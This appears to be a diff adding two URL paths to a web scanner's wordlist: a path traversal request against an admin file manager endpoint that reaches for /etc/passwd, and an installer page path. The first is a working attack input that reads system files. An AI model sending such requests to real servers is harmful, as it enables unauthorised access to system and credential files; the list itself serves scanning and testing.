@@ -1,0 +1,2 @@
+/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd
+/index.php?r=installer/welcome
